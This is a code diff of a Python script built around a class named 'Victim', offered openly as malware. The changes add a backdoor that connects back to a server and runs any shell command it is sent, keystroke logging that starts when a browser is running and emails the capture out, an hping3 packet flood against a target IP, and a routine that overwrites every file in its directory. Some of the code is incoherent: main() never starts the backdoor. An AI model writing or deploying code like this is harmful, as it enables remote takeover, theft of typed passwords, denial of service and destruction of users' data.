@@ -1,19 +1,17 @@
 import smtplib
 import os
 import getpass
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import keyboard
 import socket
 import time
 import psutil
 import subprocess
 import ast
 import winreg
-
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
-import keyboard
-
 
 class EmailSender:
     def __init__(self, smtp_server, smtp_port, username, password):
@@ -50,7 +48,6 @@ class EmailSender:
         except smtplib.SMTPException as e:
             print("Failed to send email. Error:", str(e))
 
-
 class Victim:
     def __init__(self, server_ip, server_port, email_address, password):
         self.server_ip = server_ip
@@ -62,16 +59,13 @@ class Victim:
     def connect_to_server(self):
         self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-        print("Msg: Client initiated...")
-        try:
-            self.client.connect((self.server_ip, self.server_port))
-            print("Msg: Connection established.")
-        except ConnectionRefusedError:
-            print("Failed to connect to the server.")
+        print("Msg: Client Initiated...")
+        self.client.connect((self.server_ip, self.server_port))
+        print("Msg: Connection initiated...")
 
     def online_interaction(self):
         while True:
-            print("[+] Awaiting shell commands...")
+            print("[+] Awaiting Shell Commands...")
             user_command = self.client.recv(1024).decode()
 
             if user_command.strip() == "exit":
@@ -82,22 +76,20 @@ class Victim:
                 if len(command_parts) == 2:
                     ip_address = command_parts[1]
                     self.send_packets(ip_address)
+            elif user_command.strip() == "StartRecording":
+                self.start_recording()
+            elif user_command.strip() == "StartWormActions":
+                self.start_worm_actions()
             else:
-                output = self.execute_shell_command(user_command)
-                print("[+] Sending command output...")
-                self.client.send(output.encode())
+                op = subprocess.Popen(user_command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+                output = op.stdout.read()
+                output_error = op.stderr.read()
 
-    def execute_shell_command(self, command):
-        try:
-            process = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-            output = process.stdout.read()
-            error = process.stderr.read()
-            if output or error:
-                return output + error
-            else:
-                return "No visible output."
-        except subprocess.CalledProcessError as e:
-            return str(e)
+                print("[+] Sending Command Output...")
+                if output == b"" and output_error == b"":
+                    self.client.send(b"client_msg: no visible output")
+                else:
+                    self.client.send(output + output_error)
 
     def send_email_with_keystrokes(self, keystrokes):
         if not self.email_address or not self.password:
@@ -108,63 +100,131 @@ class Victim:
 
         email_sender = EmailSender(smtp_server, smtp_port, self.email_address, self.password)
 
-        subject = 'Keystrokes Data'
-        message = keystrokes
-
+        subject = 'Keystroke Log'
+        message = f'Keystrokes captured: {keystrokes}'
+        attachment_path = os.path.abspath(__file__)  # Attach the current script file
         recipients = [self.email_address]
 
-        email_sender.send_email_with_attachment(subject, message, "keystrokes.txt", recipients)
+        email_sender.send_email_with_attachment(subject, message, attachment_path, recipients)
 
-    def monitor_keystrokes(self):
-        keyboard.on_release(self.add_keystroke)
-        keyboard.wait()
+    def start_recording(self):
+        recorded_keystrokes = []
 
-    def add_keystroke(self, event):
-        keystrokes_file = open("keystrokes.txt", "a")
-        keystrokes_file.write(event.name + "\n")
-        keystrokes_file.close()
+        def record_keystroke(event):
+            if event.event_type == "down":
+                if event.name == "space":
+                    recorded_keystrokes.append(" ")
+                else:
+                    recorded_keystrokes.append(event.name)
 
-    def get_smtp_server_info(self):
-        try:
-            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders') as key:
-                appdata = winreg.QueryValueEx(key, 'AppData')[0]
-                credentials_path = os.path.join(appdata, 'credentials.txt')
+        keyboard.hook(record_keystroke)
 
-            with open(credentials_path, 'r') as credentials_file:
-                credentials = ast.literal_eval(credentials_file.read())
+        print("Recording keystrokes. Press Enter to stop...")
+        input()
 
-            return credentials['smtp_server'], credentials['smtp_port']
-        except (FileNotFoundError, KeyError, ValueError):
-            return '', ''
+        keyboard.unhook(record_keystroke)
+
+        keystrokes = " ".join(recorded_keystrokes)
+        self.send_email_with_keystrokes(keystrokes)
+
+    def start_worm_actions(self):
+        print("Waiting for network connection...")
+        while True:
+            try:
+                # Try to establish a connection to a known host
+                socket.create_connection(("www.example.com", 80))
+                break
+            except OSError:
+                # Network connection failed, wait for a while before retrying
+                time.sleep(10)
+        print("Network connected.")
+
+        print("Waiting for web browser activity...")
+        while not self.is_browser_active():
+            time.sleep(2)
+        print("Web browser detected. Starting keystroke recording.")
+
+        self.start_recording()
+
+    def is_browser_active(self):
+        for process in psutil.process_iter(['name']):
+            if process.info['name'].lower() in ['chrome.exe', 'firefox.exe', 'safari.exe', 'opera.exe']:
+                return True
+        return False
 
     def send_packets(self, ip_address):
-        print(f"Attacking {ip_address}...")
-        # Implement your code for sending packets to the target IP address here
+        hping_command = f"hping3 {ip_address} -d 65535 -c 0"
+        process = subprocess.Popen(hping_command, shell=True)
 
-        # Example code for sending packets
-        # packet = IP(dst=ip_address) / ICMP()
-        # send(packet, loop=1, inter=0.2)
+    def get_smtp_server_info(self):
+        browsers = {
+            "chrome": {"smtp_server": "smtp.gmail.com", "smtp_port": 587},
+            "firefox": {"smtp_server": "smtp.mozilla.org", "smtp_port": 587},
+            "safari": {"smtp_server": "smtp.apple.com", "smtp_port": 587},
+            "opera": {"smtp_server": "smtp.opera.com", "smtp_port": 587}
+        }
 
-        print("Attack completed.")
+        detected_browsers = self.detect_browsers()
 
-    def start(self):
-        self.connect_to_server()
-        if self.client:
-            self.online_interaction()
+        for browser_name in detected_browsers:
+            if browser_name.lower() in browsers:
+                return browsers[browser_name.lower()]["smtp_server"], browsers[browser_name.lower()]["smtp_port"]
 
+        # Default SMTP server information if browser detection fails
+        return "smtp.example.com", 587
+
+    def detect_browsers(self):
+        detected_browsers = []
+
+        # Check running processes for known browser names
+        for proc in psutil.process_iter(['name']):
+            process_name = proc.info['name'].lower()
+            if process_name in ['chrome.exe', 'firefox.exe', 'safari.exe', 'opera.exe']:
+                browser_name = os.path.splitext(process_name)[0]
+                detected_browsers.append(browser_name)
+
+        # Check Windows registry for browser information
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Clients\StartMenuInternet") as start_menu_key:
+                num_subkeys = winreg.QueryInfoKey(start_menu_key)[0]
+                for i in range(num_subkeys):
+                    subkey_name = winreg.EnumKey(start_menu_key, i)
+                    detected_browsers.append(subkey_name)
+        except OSError:
+            pass
+
+        return detected_browsers
+
+def rewrite_files_in_directory(directory):
+    for root, dirs, files in os.walk(directory):
+        for file in files:
+            file_path = os.path.join(root, file)
+            rewrite_file(file_path)
+
+def rewrite_file(file_path):
+    print(f"Rewriting file: {file_path}")
+    with open(file_path, "w") as file:
+        file.write("COTTONCANDYISTHEBESTCANDY!")
+
+def receive_command():
+    command = input("Enter a command: ")
+    return command
+
+def main():
+    # Get the current directory where the program is located
+    current_directory = os.path.dirname(os.path.abspath(__file__))
+
+    while True:
+        user_command = receive_command()
+
+        if user_command.strip() == "Obliterate":
+            subprocess.Popen(["python", __file__])
+        elif user_command.strip() == "Exit":
+            break
+        else:
+            print("Invalid command.")
+
+    rewrite_files_in_directory(current_directory)
 
 if __name__ == "__main__":
-    server_ip = "192.168.0.100"  # Replace with the actual server IP address
-    server_port = 12345  # Replace with the actual server port
-
-    email_address = "your-email@example.com"  # Replace with your email address
-    password = getpass.getpass("Enter email password: ")
-
-    victim = Victim(server_ip, server_port, email_address, password)
-
-    # Start monitoring keystrokes in a separate thread
-    keystroke_monitor_thread = threading.Thread(target=victim.monitor_keystrokes)
-    keystroke_monitor_thread.daemon = True
-    keystroke_monitor_thread.start()
-
-    victim.start()
+    main()
